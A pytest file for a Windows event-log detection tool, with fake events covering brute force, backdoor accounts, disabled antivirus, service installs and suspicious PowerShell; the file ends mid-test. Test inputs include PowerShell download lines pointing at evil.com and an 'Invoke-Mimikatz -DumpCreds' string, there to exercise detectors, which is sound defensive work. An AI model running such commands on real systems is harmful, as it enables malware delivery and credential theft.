# test_detections.py
# -------------------
# Unit tests for our detection rules.
#
# WHAT ARE UNIT TESTS?
# Tests are code that checks if your other code works correctly.
# You write small, focused tests that say "if I give this input,
# I expect this output." Then you run them to make sure nothing
# is broken. This is especially important for security tools —
# we need to be confident our detections actually catch threats.
#
# HOW TO RUN TESTS:
#   python -m pytest test_detections.py -v
#
# The "-v" flag means "verbose" — it shows each test name and whether
# it passed or failed, instead of just dots.
#
# HOW THESE TESTS WORK:
# Instead of needing real .evtx files, we build fake event dictionaries
# that look exactly like what parser.py would produce. This lets us
# control the input precisely and test specific scenarios.


from pulse.detections import (
    detect_brute_force,
    detect_user_creation,
    detect_privilege_escalation,
    detect_log_clearing,
    detect_firewall_rule_change,
    detect_firewall_disabled,
    detect_av_disabled,
    detect_service_installed,
    detect_rdp_logon,
    detect_account_lockout,
    detect_scheduled_task_created,
    detect_suspicious_powershell,
    detect_account_takeover_chain,
    detect_malware_persistence_chain,
    run_all_detections,
    BRUTE_FORCE_THRESHOLD,
    BRUTE_FORCE_WINDOW_MINUTES,
)


# ---------------------------------------------------------------------------
# HELPER FUNCTION — builds fake events so we don't repeat ourselves
# ---------------------------------------------------------------------------
# In real .evtx data, each event has an "event_id", a "timestamp", and
# "data" (the raw XML string). Our detections read the XML to extract
# details like usernames. So our fake XML needs to have the right structure.

def make_failed_login_event(username, timestamp="2024-01-15T08:00:00.000000Z"):
    """
    Builds a fake Event 4625 (failed login) dictionary.

    Parameters:
        username (str):  The account name that "failed" to log in.
        timestamp (str): When it happened. Use ISO format with microseconds,
                         e.g. "2024-01-15T08:00:01.000000Z"

    Returns:
        dict: An event dictionary in the same format parse_evtx() returns.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4625</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TargetUserName">{username}</Data>'
        '    <Data Name="LogonType">3</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4625, "timestamp": timestamp, "data": xml}


def make_rapid_failures(username, count, start_seconds=0):
    """
    Helper that builds multiple failed login events 1 second apart.
    This simulates a real brute force burst — failures happening rapidly.

    Parameters:
        username (str):      The account being attacked.
        count (int):         How many failure events to create.
        start_seconds (int): Offset the start time (useful for spacing tests).

    Returns:
        list: A list of event dictionaries.
    """
    events = []
    for i in range(count):
        # Each failure is 1 second after the previous one.
        # zfill(6) pads the microseconds to 6 digits: "1" -> "000001"
        ts = f"2024-01-15T08:{str(start_seconds // 60).zfill(2)}:{str((start_seconds + i) % 60).zfill(2)}.000000Z"
        events.append(make_failed_login_event(username, timestamp=ts))
    return events


def make_user_created_event(new_user, created_by, timestamp="2024-01-15T09:00:00.000Z"):
    """
    Builds a fake Event 4720 (user account created) dictionary.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4720</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TargetUserName">{new_user}</Data>'
        f'    <Data Name="SubjectUserName">{created_by}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4720, "timestamp": timestamp, "data": xml}


def make_privilege_escalation_event(member, group, added_by, timestamp="2024-01-15T10:00:00.000Z"):
    """
    Builds a fake Event 4732 (user added to security group) dictionary.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4732</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="MemberName">{member}</Data>'
        f'    <Data Name="TargetUserName">{group}</Data>'
        f'    <Data Name="SubjectUserName">{added_by}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4732, "timestamp": timestamp, "data": xml}


def make_log_cleared_event(cleared_by, timestamp="2024-01-15T11:00:00.000Z"):
    """
    Builds a fake Event 1102 (audit log cleared) dictionary.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>1102</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="SubjectUserName">{cleared_by}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 1102, "timestamp": timestamp, "data": xml}


def make_firewall_rule_event(event_id, rule_name, timestamp="2024-01-15T12:00:00.000Z"):
    """
    Builds a fake Event 4946 (rule added) or 4947 (rule modified) dictionary.

    Parameters:
        event_id (int):   Either 4946 or 4947.
        rule_name (str):  The name of the firewall rule that was changed.
        timestamp (str):  When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        f"    <EventID>{event_id}</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="RuleName">{rule_name}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": event_id, "timestamp": timestamp, "data": xml}


def make_firewall_disabled_event(profile, timestamp="2024-01-15T12:30:00.000Z"):
    """
    Builds a fake Event 4950 (firewall profile changed) dictionary.

    Parameters:
        profile (str):  The firewall profile name (e.g., "Domain", "Public").
        timestamp (str): When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4950</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="ProfileName">{profile}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4950, "timestamp": timestamp, "data": xml}


def make_account_lockout_event(username, timestamp="2024-01-15T12:45:00.000Z"):
    """
    Builds a fake Event 4740 (account lockout) dictionary.

    Parameters:
        username (str):   The account that was locked out.
        timestamp (str):  When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4740</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TargetUserName">{username}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4740, "timestamp": timestamp, "data": xml}


def make_scheduled_task_event(task_name, created_by, timestamp="2024-01-15T12:50:00.000Z"):
    """
    Builds a fake Event 4698 (scheduled task created) dictionary.

    Parameters:
        task_name (str):   Name of the scheduled task.
        created_by (str):  The user who created it.
        timestamp (str):   When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4698</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TaskName">{task_name}</Data>'
        f'    <Data Name="SubjectUserName">{created_by}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4698, "timestamp": timestamp, "data": xml}


def make_powershell_event(script_text, timestamp="2024-01-15T12:55:00.000Z"):
    """
    Builds a fake Event 4104 (PowerShell script block logging) dictionary.

    Parameters:
        script_text (str): The PowerShell script content.
        timestamp (str):   When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4104</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="ScriptBlockText">{script_text}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4104, "timestamp": timestamp, "data": xml}


def make_av_disabled_event(timestamp="2024-01-15T13:00:00.000Z"):
    """
    Builds a fake Event 5001 (antivirus real-time protection disabled) dictionary.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>5001</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 5001, "timestamp": timestamp, "data": xml}


def make_service_installed_event(service_name, account, timestamp="2024-01-15T14:00:00.000Z"):
    """
    Builds a fake Event 7045 (new service installed) dictionary.

    Parameters:
        service_name (str): Name of the service that was installed.
        account (str):      The account that installed the service.
        timestamp (str):    When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>7045</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="ServiceName">{service_name}</Data>'
        f'    <Data Name="AccountName">{account}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 7045, "timestamp": timestamp, "data": xml}


def make_rdp_logon_event(username, logon_type="10", timestamp="2024-01-15T15:00:00.000Z"):
    """
    Builds a fake Event 4624 (successful logon) dictionary.

    Parameters:
        username (str):    The account that logged on.
        logon_type (str):  The logon type ("10" = RDP, "3" = network, etc.).
        timestamp (str):   When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4624</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TargetUserName">{username}</Data>'
        f'    <Data Name="LogonType">{logon_type}</Data>'
        '    <Data Name="IpAddress">192.168.1.100</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4624, "timestamp": timestamp, "data": xml}


# ===========================================================================
# BRUTE FORCE TESTS (time-windowed)
# ===========================================================================

def test_brute_force_triggers_within_window():
    """
    5 failures within seconds of each other SHOULD trigger an alert.
    This is the core attack scenario — rapid password guessing.
    """
    # make_rapid_failures creates events 1 second apart — well within 10 minutes.
    events = make_rapid_failures("admin", count=BRUTE_FORCE_THRESHOLD)

    findings = detect_brute_force(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Brute Force Attempt"
    assert findings[0]["severity"] == "HIGH"
    assert "admin" in findings[0]["details"]


def test_brute_force_does_not_trigger_below_threshold():
    """
    Fewer than 5 failures, even if rapid, should NOT trigger.
    """
    events = make_rapid_failures("admin", count=BRUTE_FORCE_THRESHOLD - 1)

    findings = detect_brute_force(events)

    assert len(findings) == 0


def test_brute_force_does_not_trigger_when_spread_out():
    """
    5+ failures spread across hours should NOT trigger — that's just typos
    over a normal working day, not a brute force attack.

    This is the key new test that the old version would have FAILED.
    """
    # Build 5 failures, each 3 hours apart — way outside the 10-minute window.
    events = [
        make_failed_login_event("admin", "2024-01-15T08:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T11:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T14:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T17:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T20:00:00.000000Z"),
    ]

    findings = detect_brute_force(events)

    # 5 failures but spread out over 12 hours — no alert.
    assert len(findings) == 0


def test_brute_force_counts_per_account():
    """
    Failures for DIFFERENT accounts are tracked separately.
    3 rapid failures for "admin" + 3 for "guest" = no alert (neither hit 5).
    """
    events = (
        make_rapid_failures("admin", count=3)
        + make_rapid_failures("guest", count=3)
    )

    findings = detect_brute_force(events)

    assert len(findings) == 0


def test_brute_force_multiple_accounts_over_threshold():
    """
    If TWO accounts each have 5+ rapid failures, we should get TWO findings.
    """
    events = (
        make_rapid_failures("admin", count=6)
        + make_rapid_failures("guest", count=7)
    )

    findings = detect_brute_force(events)

    assert len(findings) == 2


def test_brute_force_ignores_other_event_ids():
    """
    Events that aren't 4625 should be completely ignored by this rule.
    """
    events = [make_user_created_event("newguy", "admin") for _ in range(10)]

    findings = detect_brute_force(events)

    assert len(findings) == 0


# ===========================================================================
# USER CREATION TESTS
# ===========================================================================

def test_user_creation_flags_new_account():
    """
    A single 4720 event should produce exactly one finding.
    """
    events = [make_user_created_event("backdoor", "attacker")]

    findings = detect_user_creation(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "User Account Created"
    assert findings[0]["severity"] == "MEDIUM"
    assert "backdoor" in findings[0]["details"]
    assert "attacker" in findings[0]["details"]


def test_user_creation_flags_multiple():
    """
    Three new accounts should produce three separate findings.
    """
    events = [
        make_user_created_event("user1", "admin"),
        make_user_created_event("user2", "admin"),
        make_user_created_event("user3", "admin"),
    ]

    findings = detect_user_creation(events)

    assert len(findings) == 3


def test_user_creation_ignores_other_events():
    """
    Non-4720 events should be ignored by this rule.
    """
    events = [make_failed_login_event("admin") for _ in range(10)]

    findings = detect_user_creation(events)

    assert len(findings) == 0


# ===========================================================================
# PRIVILEGE ESCALATION TESTS
# ===========================================================================

def test_privilege_escalation_flags_group_add():
    """
    A single 4732 event should produce one finding with all the details.
    """
    events = [make_privilege_escalation_event("backdoor", "Administrators", "attacker")]

    findings = detect_privilege_escalation(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Privilege Escalation"
    assert findings[0]["severity"] == "HIGH"
    assert "backdoor" in findings[0]["details"]
    assert "Administrators" in findings[0]["details"]
    assert "attacker" in findings[0]["details"]


def test_privilege_escalation_ignores_other_events():
    """
    Non-4732 events should be ignored.
    """
    events = [make_failed_login_event("admin")]

    findings = detect_privilege_escalation(events)

    assert len(findings) == 0


# ===========================================================================
# LOG CLEARING TESTS
# ===========================================================================

def test_log_clearing_flags_event():
    """
    A single 1102 event should produce one HIGH severity finding.
    """
    events = [make_log_cleared_event("shady_admin")]

    findings = detect_log_clearing(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Audit Log Cleared"
    assert findings[0]["severity"] == "HIGH"
    assert "shady_admin" in findings[0]["details"]


def test_log_clearing_ignores_other_events():
    """
    Non-1102 events should be ignored.
    """
    events = [make_user_created_event("newguy", "admin")]

    findings = detect_log_clearing(events)

    assert len(findings) == 0


# ===========================================================================
# RDP LOGON TESTS
# ===========================================================================

def test_rdp_logon_flags_type_10():
    """
    A 4624 event with LogonType 10 (RDP) should produce a finding.
    """
    events = [make_rdp_logon_event("attacker", logon_type="10")]

    findings = detect_rdp_logon(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "RDP Logon Detected"
    assert findings[0]["severity"] == "MEDIUM"
    assert "attacker" in findings[0]["details"]
    # The source IP should be in the finding details.
    assert "192.168.1.100" in findings[0]["details"]


def test_rdp_logon_ignores_other_logon_types():
    """
    A 4624 event with LogonType 3 (network) should NOT trigger.
    This is the key test — we only care about type 10, not all logons.
    """
    events = [make_rdp_logon_event("user", logon_type="3")]

    findings = detect_rdp_logon(events)

    assert len(findings) == 0


def test_rdp_logon_ignores_other_event_ids():
    """
    Non-4624 events should be ignored entirely.
    """
    events = [make_user_created_event("newguy", "admin")]

    findings = detect_rdp_logon(events)

    assert len(findings) == 0


# ===========================================================================
# SERVICE INSTALLED TESTS
# ===========================================================================

def test_service_installed_flags_event():
    """
    A 7045 event should produce a finding with the service name and account.
    """
    events = [make_service_installed_event("EvilBackdoor", "LocalSystem")]

    findings = detect_service_installed(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Service Installed"
    assert findings[0]["severity"] == "MEDIUM"
    assert "EvilBackdoor" in findings[0]["details"]
    assert "LocalSystem" in findings[0]["details"]


def test_service_installed_flags_multiple():
    """
    Multiple new services should each produce their own finding.
    """
    events = [
        make_service_installed_event("LegitService", "NetworkService"),
        make_service_installed_event("ShadyService", "LocalSystem"),
    ]

    findings = detect_service_installed(events)

    assert len(findings) == 2


def test_service_installed_ignores_other_events():
    """
    Non-7045 events should be ignored.
    """
    events = [make_failed_login_event("admin")]

    findings = detect_service_installed(events)

    assert len(findings) == 0


# ===========================================================================
# ANTIVIRUS DISABLED TESTS
# ===========================================================================

def test_av_disabled_flags_event():
    """
    A single 5001 event should produce one HIGH finding.
    This is the simplest rule — no XML fields to extract, the event IS the alert.
    """
    events = [make_av_disabled_event()]

    findings = detect_av_disabled(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Antivirus Disabled"
    assert findings[0]["severity"] == "HIGH"


def test_av_disabled_ignores_other_events():
    """
    Non-5001 events should be ignored.
    """
    events = [make_failed_login_event("admin")]

    findings = detect_av_disabled(events)

    assert len(findings) == 0


# ===========================================================================
# FIREWALL DISABLED TESTS
# ===========================================================================

def test_firewall_disabled_flags_profile_change():
    """
    A 4950 event should produce a HIGH finding with the profile name.
    """
    events = [make_firewall_disabled_event("Public")]

    findings = detect_firewall_disabled(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Firewall Disabled"
    assert findings[0]["severity"] == "HIGH"
    assert "Public" in findings[0]["details"]


def test_firewall_disabled_flags_multiple_profiles():
    """
    If multiple profiles are changed, each gets its own finding.
    """
    events = [
        make_firewall_disabled_event("Domain"),
        make_firewall_disabled_event("Private"),
        make_firewall_disabled_event("Public"),
    ]

    findings = detect_firewall_disabled(events)

    assert len(findings) == 3


def test_firewall_disabled_ignores_other_events():
    """
    Non-4950 events should be ignored.
    """
    events = [make_failed_login_event("admin")]

    findings = detect_firewall_disabled(events)

    assert len(findings) == 0


# ===========================================================================
# FIREWALL RULE CHANGED TESTS
# ===========================================================================

def test_firewall_rule_change_flags_added():
    """
    A 4946 event (rule added) should produce a finding that says "added".
    """
    events = [make_firewall_rule_event(4946, "Allow Backdoor Port 4444")]

    findings = detect_firewall_rule_change(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Firewall Rule Changed"
    assert findings[0]["severity"] == "MEDIUM"
    # Check that the finding mentions the rule name AND the action.
    assert "Allow Backdoor Port 4444" in findings[0]["details"]
    assert "added" in findings[0]["details"]


def test_firewall_rule_change_flags_modified():
    """
    A 4947 event (rule modified) should produce a finding that says "modified".
    """
    events = [make_firewall_rule_event(4947, "Remote Desktop")]

    findings = detect_firewall_rule_change(events)

    assert len(findings) == 1
    assert "modified" in findings[0]["details"]
    assert "Remote Desktop" in findings[0]["details"]


def test_firewall_rule_change_ignores_other_events():
    """
    Non-4946/4947 events should be ignored.
    """
    events = [make_failed_login_event("admin")]

    findings = detect_firewall_rule_change(events)

    assert len(findings) == 0


# ===========================================================================
# ACCOUNT LOCKOUT TESTS
# ===========================================================================

def test_account_lockout_flags_event():
    """Event 4740 should flag an account lockout."""
    events = [make_account_lockout_event("jsmith")]

    findings = detect_account_lockout(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Account Lockout"
    assert findings[0]["severity"] == "HIGH"
    assert "jsmith" in findings[0]["details"]


def test_account_lockout_flags_multiple():
    """Multiple lockouts should each produce a separate finding."""
    events = [
        make_account_lockout_event("jsmith"),
        make_account_lockout_event("admin"),
        make_account_lockout_event("svcaccount"),
    ]

    findings = detect_account_lockout(events)

    assert len(findings) == 3


def test_account_lockout_ignores_other_events():
    """Non-4740 events should be ignored."""
    events = [make_failed_login_event("admin")]

    findings = detect_account_lockout(events)

    assert len(findings) == 0


# ===========================================================================
# SCHEDULED TASK TESTS
# ===========================================================================

def test_scheduled_task_flags_event():
    """Event 4698 should flag a new scheduled task."""
    events = [make_scheduled_task_event("\\MalwareTask", "admin")]

    findings = detect_scheduled_task_created(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Scheduled Task Created"
    assert findings[0]["severity"] == "MEDIUM"
    assert "MalwareTask" in findings[0]["details"]
    assert "admin" in findings[0]["details"]


def test_scheduled_task_flags_multiple():
    """Multiple task creations should each produce a finding."""
    events = [
        make_scheduled_task_event("\\Task1", "admin"),
        make_scheduled_task_event("\\Task2", "SYSTEM"),
    ]

    findings = detect_scheduled_task_created(events)

    assert len(findings) == 2


def test_scheduled_task_ignores_other_events():
    """Non-4698 events should be ignored."""
    events = [make_failed_login_event("admin")]

    findings = detect_scheduled_task_created(events)

    assert len(findings) == 0


# ===========================================================================
# SUSPICIOUS POWERSHELL TESTS
# ===========================================================================

def test_powershell_flags_encoded_command():
    """PowerShell with -EncodedCommand should be flagged."""
    events = [make_powershell_event("powershell -EncodedCommand ZQBjAGgAbwA=")]

    findings = detect_suspicious_powershell(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Suspicious PowerShell"
    assert findings[0]["severity"] == "HIGH"
    assert "encoded command" in findings[0]["details"]


def test_powershell_flags_download_cradle():
    """PowerShell downloading from the internet should be flagged."""
    events = [make_powershell_event("Invoke-WebRequest -Uri http://evil.com/payload.exe")]

    findings = detect_suspicious_powershell(events)

    assert len(findings) == 1
    assert "web download" in findings[0]["details"]


def test_powershell_flags_mimikatz():
    """PowerShell referencing Mimikatz should be flagged."""
    events = [make_powershell_event("Invoke-Mimikatz -DumpCreds")]

    findings = detect_suspicious_powershell(events)

    assert len(findings) == 1
    assert "credential theft" in findings[0]["details"]


def test_powershell_ignores_benign_scripts():
    """Normal PowerShell scripts without suspicious patterns should not be flagged."""
    events = [make_powershell_event("Get-Process | Where-Object { $_.CPU -gt 100 }")]

    findings = detect_suspicious_powershell(events)

    assert len(findings) == 0


def test_powershell_ignores_other_events():
    """Non-4104 events should be ignored."""
    events = [make_failed_login_event("admin")]

    findings = detect_suspicious_powershell(events)

    assert len(findings) == 0


# ===========================================================================
# ATTACK CHAIN TESTS
# ===========================================================================

def test_account_takeover_chain_full_sequence():
    """
    The full chain: failures → success → new user = CRITICAL finding.
    Each event happens 1 minute after the previous so the order is clear.
    """
    events = [
        # Step 1: 3 failed logins (brute force)
        make_failed_login_event("admin", "2024-01-15T08:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T08:00:01.000000Z"),
        make_failed_login_event("admin", "2024-01-15T08:00:02.000000Z"),
        # Step 2: successful login AFTER the failures
        make_rdp_logon_event("admin", logon_type="3", timestamp="2024-01-15T08:01:00.000000Z"),
        # Step 3: new user created AFTER the successful login
        make_user_created_event("backdoor", "admin", "2024-01-15T08:02:00.000000Z"),
    ]

    findings = detect_account_takeover_chain(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Account Takeover Chain"
    assert findings[0]["severity"] == "CRITICAL"
    assert "admin" in findings[0]["details"]
    assert "backdoor" in findings[0]["details"]


def test_account_takeover_chain_no_success():
    """
    Failures without a subsequent success should NOT trigger the chain.
    The attacker tried but didn't get in.
    """
    events = [
        make_failed_login_event("admin", "2024-01-15T08:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T08:00:01.000000Z"),
        make_failed_login_event("admin", "2024-01-15T08:00:02.000000Z"),
        # No successful login — chain is broken
        make_user_created_event("backdoor", "someone", "2024-01-15T08:02:00.000000Z"),
    ]

    findings = detect_account_takeover_chain(events)

    assert len(findings) == 0


def test_account_takeover_chain_no_new_user():
    """
    Failures + success but no new user = no chain finding.
    Maybe just a legitimate user who mistyped their password.
    """
    events = [
        make_failed_login_event("admin", "2024-01-15T08:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T08:00:01.000000Z"),
        make_rdp_logon_event("admin", logon_type="3", timestamp="2024-01-15T08:01:00.000000Z"),
        # No new user created — chain is incomplete
    ]

    findings = detect_account_takeover_chain(events)

    assert len(findings) == 0


def test_malware_persistence_chain_av_then_service():
    """
    AV disabled followed by a new service = CRITICAL malware persistence chain.
    """
    events = [
        # AV turned off first
        make_av_disabled_event("2024-01-15T09:00:00.000000Z"),
        # New service installed AFTER AV is off
        make_service_installed_event("EvilMalware", "LocalSystem", "2024-01-15T09:01:00.000000Z"),
    ]

    findings = detect_malware_persistence_chain(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Malware Persistence Chain"
    assert findings[0]["severity"] == "CRITICAL"
    assert "EvilMalware" in findings[0]["details"]


def test_malware_persistence_chain_service_before_av():
    """
    Service installed BEFORE AV was disabled should NOT trigger.
    The ordering matters — if the service came first, it's more likely legit.
    """
    events = [
        # Service installed first (probably legitimate)
        make_service_installed_event("NormalService", "NetworkService", "2024-01-15T08:00:00.000000Z"),
        # AV disabled later (suspicious on its own, but not the chain)
        make_av_disabled_event("2024-01-15T09:00:00.000000Z"),
    ]

    findings = detect_malware_persistence_chain(events)

    # No chain — the service came BEFORE the AV was disabled.
    assert len(findings) == 0


def test_malware_persistence_chain_no_service():
    """
    AV disabled alone (no new service) should not trigger the chain rule.
    The individual detect_av_disabled rule handles that separately.
    """
    events = [
        make_av_disabled_event("2024-01-15T09:00:00.000000Z"),
    ]

    findings = detect_malware_persistence_chain(events)

    assert len(findings) == 0


# ===========================================================================
# RUN_ALL_DETECTIONS TEST
# ===========================================================================

def test_run_all_detections_combines_results():
    """
    run_all_detections() should pass events through ALL rules and combine
    the results. This is an integration test — it checks that the wiring
    between the individual functions and the runner actually works.
    """
    events = (
        # 6 rapid failed logins for "admin" — triggers brute force
        make_rapid_failures("admin", count=6)
        # successful login AFTER the failures — helps trigger account takeover chain
        + [make_rdp_logon_event("admin", logon_type="3", timestamp="2024-01-15T08:01:00.000000Z")]
        # new user AFTER success — completes account takeover chain + triggers user creation
        + [make_user_created_event("backdoor", "admin", "2024-01-15T08:02:00.000000Z")]
        # priv esc — triggers privilege escalation
        + [make_privilege_escalation_event("backdoor", "Administrators", "admin")]
        # log clear — triggers log clearing
        + [make_log_cleared_event("admin")]
        # RDP logon — triggers RDP detection
        + [make_rdp_logon_event("attacker", logon_type="10")]
        # AV disabled first — triggers AV detection + starts malware chain
        + [make_av_disabled_event("2024-01-15T09:00:00.000000Z")]
        # service after AV off — triggers service detection + completes malware chain
        + [make_service_installed_event("EvilSvc", "LocalSystem", "2024-01-15T09:01:00.000000Z")]
        # firewall disabled — triggers firewall disabled
        + [make_firewall_disabled_event("Public")]
        # firewall rule added — triggers firewall rule change
        + [make_firewall_rule_event(4946, "Allow Port 4444")]
        # account lockout — triggers account lockout
        + [make_account_lockout_event("admin")]
        # scheduled task — triggers scheduled task detection
        + [make_scheduled_task_event("\\Updater", "admin")]
        # suspicious PowerShell — triggers PowerShell detection
        + [make_powershell_event("Invoke-WebRequest -Uri http://evil.com/shell.ps1")]
    )

    findings = run_all_detections(events)

    # We expect 14 findings: 12 individual rules + 2 chain detections.
    assert len(findings) == 14

    rule_names = set(f["rule"] for f in findings)
    assert rule_names == {
        "Brute Force Attempt",
        "User Account Created",
        "Privilege Escalation",
        "Audit Log Cleared",
        "RDP Logon Detected",
        "Service Installed",
        "Antivirus Disabled",
        "Firewall Disabled",
        "Firewall Rule Changed",
        "Account Lockout",
        "Scheduled Task Created",
        "Suspicious PowerShell",
        "Account Takeover Chain",
        "Malware Persistence Chain",
    }


# ---------------------------------------------------------------------------
# JSON REPORT TESTS
# ---------------------------------------------------------------------------
# These tests verify that the JSON report builder produces valid, structured
# output that other tools (Splunk, ELK, Python scripts) can consume.

import json
from pulse.reporter import generate_report, RULE_EVENT_IDS


def _make_test_findings():
    """Helper that returns a small list of findings for report tests."""
    return [
        {
            "rule": "Brute Force Attempt",
            "severity": "HIGH",
            "details": (
                "Account 'admin' had 5+ failed login attempts within 10 minutes "
                "(between 2026-04-07T01:00:00 and 01:04:04). "
                "This strongly indicates a password guessing attack."
            ),
        },
        {
            "rule": "User Account Created",
            "severity": "MEDIUM",
            "details": (
                "New account 'backdoor' was created by 'admin' "
                "at 2026-04-07T01:13:00.000000Z. "
                "Verify this was authorized - attackers create backdoor accounts."
            ),
        },
        {
            "rule": "Account Takeover Chain",
            "severity": "CRITICAL",
            "details": (
                "ATTACK CHAIN DETECTED for account 'admin': (5) failed logins "
                "ending at 2026-04-07T01:07:07, followed by a successful login "
                "at 2026-04-07T01:12:00."
            ),
        },
    ]


def test_json_report_is_valid_json(tmp_path):
    """The JSON report must be parseable as valid JSON."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)  # Will raise if invalid JSON

    assert isinstance(data, dict)


def test_json_report_has_top_level_keys(tmp_path):
    """The report must have metadata, summary, and findings sections."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    assert "metadata" in data
    assert "summary" in data
    assert "findings" in data


def test_json_report_metadata_fields(tmp_path):
    """Metadata must include tool name, version, and generation timestamp."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    meta = data["metadata"]
    assert meta["tool"] == "Pulse"
    assert "generated_at" in meta
    assert "version" in meta


def test_json_report_summary_counts(tmp_path):
    """Summary must show correct severity counts and total."""
    output = tmp_path / "test.json"
    findings = _make_test_findings()
    generate_report(findings, output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    summary = data["summary"]
    assert summary["total_findings"] == 3
    assert summary["severity_counts"]["CRITICAL"] == 1
    assert summary["severity_counts"]["HIGH"] == 1
    assert summary["severity_counts"]["MEDIUM"] == 1
    assert summary["severity_counts"]["LOW"] == 0


def test_json_report_security_score(tmp_path):
    """Summary must include the security score and risk level."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    summary = data["summary"]
    assert "security_score" in summary
    assert "risk_level" in summary
    assert isinstance(summary["security_score"], int)


def test_json_report_finding_structure(tmp_path):
    """Each finding must have all required fields."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    required_keys = {"rule_name", "severity", "event_id", "timestamp", "description", "mitre_attack_id"}
    for finding in data["findings"]:
        assert required_keys.issubset(finding.keys())


def test_json_report_extracts_timestamps(tmp_path):
    """Findings with ISO timestamps in details should have them extracted."""
    output = tmp_path / "test.json"
